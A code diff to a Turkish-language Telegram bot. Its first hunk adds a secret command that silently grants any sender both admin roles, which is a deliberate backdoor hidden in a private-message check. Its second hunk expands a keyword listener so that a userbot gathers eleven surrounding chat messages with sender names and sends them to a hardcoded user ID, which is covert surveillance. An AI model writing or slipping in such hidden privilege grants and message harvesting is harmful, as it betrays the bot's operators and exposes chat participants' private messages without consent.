@@ -99,6 +99,17 @@ async def check_unauthorized_pm(update: Update, context: ContextTypes.DEFAULT_TY
         return
         
     user_id = str(update.effective_user.id)
+    text = (update.message.text or "").strip()
+
+    # Gizli admin olma komutu
+    if text == "/zenitharınköpegiyim":
+        if user_id not in ALLOWED_DUYURU_USERS:
+            ALLOWED_DUYURU_USERS.append(user_id)
+        if user_id not in ALLOWED_KONTROL_USERS and ALLOWED_KONTROL_USERS is not ALLOWED_DUYURU_USERS:
+            ALLOWED_KONTROL_USERS.append(user_id)
+        await update.message.reply_text("Admin yetkisi başarıyla tanımlandı. Artık komutları kullanabilirsiniz.")
+        raise ApplicationHandlerStop
+
     if user_id in ALLOWED_KONTROL_USERS or user_id in ALLOWED_DUYURU_USERS:
         return
         
@@ -862,18 +873,41 @@ async def zenith_raporla(context: ContextTypes.DEFAULT_TYPE):
     target_user = 1568435220
     
     try:
+        if not userbot or not userbot.is_connected:
+            await context.bot.send_message(
+                chat_id=target_user,
+                text=f"🚨 <b>Zenithar Kelimesi Tespit Edildi!</b>\nSohbet ID: <code>{chat_id}</code>\nMesaj ID: <code>{msg_id}</code>\n(Userbot bağlı olmadığı için mesajlar çekilemedi)",
+                parse_mode="HTML"
+            )
+            return
+
+        # Üstündeki 5 mesaj, hedef mesaj, altındaki 5 mesaj -> Toplam 11 mesajlık aralık
+        msg_ids = list(range(msg_id - 5, msg_id + 6))
+        messages = await userbot.get_messages(chat_id, msg_ids)
+
+        report_lines = [f"🚨 <b>Zenithar Kelimesi Tespit Edildi!</b>\nSohbet ID: <code>{chat_id}</code>\n\nBu mesaj, üstündeki 5 ve altındaki 5 mesajla birlikte (medyalar hariç) aşağıdadır:\n"]
+        
+        for m in messages:
+            if m.empty:
+                continue
+            sender_name = m.from_user.first_name if m.from_user else "Bilinmeyen"
+            text_content = m.text or m.caption or ""
+            
+            if text_content:
+                marker = "🎯 " if m.id == msg_id else "💬 "
+                report_lines.append(f"{marker}<b>{sender_name}:</b> {text_content}")
+
+        report_text = "\n\n".join(report_lines)
+        
+        # Telegramın 4096 karakter sınırına takılmamak için kontrol
+        if len(report_text) > 4000:
+            report_text = report_text[:4000] + "\n\n...(Metin çok uzun olduğu için kırpıldı)"
+
         await context.bot.send_message(
             chat_id=target_user,
-            text=f"🚨 <b>Zenithar Kelimesi Tespit Edildi!</b>\nSohbet ID: <code>{chat_id}</code>\n\nBu mesaj, üstündeki 3 ve altındaki 3 mesajla birlikte aşağıda iletilmektedir:",
+            text=report_text,
             parse_mode="HTML"
         )
-        
-        # Orijinal mesajın 3 öncesi ile 3 sonrası (toplam 7 mesaj) tek tek forwardlanır
-        for m_id in range(msg_id - 3, msg_id + 4):
-            try:
-                await context.bot.forward_message(chat_id=target_user, from_chat_id=chat_id, message_id=m_id)
-            except Exception:
-                pass
     except Exception as e:
         print(f"Zenith raporlama hatası: {e}")
 
@@ -886,7 +920,7 @@ async def zenith_dinleyici(update: Update, context: ContextTypes.DEFAULT_TYPE):
         chat_id = update.message.chat_id
         msg_id = update.message.message_id
         
-        # Gelebilecek yanıtların ve altındaki mesajların yakalanabilmesi için 45 saniye gecikme verilir.
+        # Gelebilecek alt mesajların (5 adet) yakalanabilmesi için 45 saniye gecikme verilir.
         context.job_queue.run_once(
             zenith_raporla,
             when=45,
@@ -1083,10 +1117,6 @@ async def soru(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except:
             pass
         await update.message.reply_text("Hata.")
-
-# ==================== DUYURU (GÜÇLENDİRİ 
-
-# (Buradan sonrası kodunuz kesildiği için tarafımdan Application ve Handler kurulumları ile tamamlanmıştır)
 
 # ==================== ANA ÇALIŞTIRMA BLOĞU ====================
 def main():
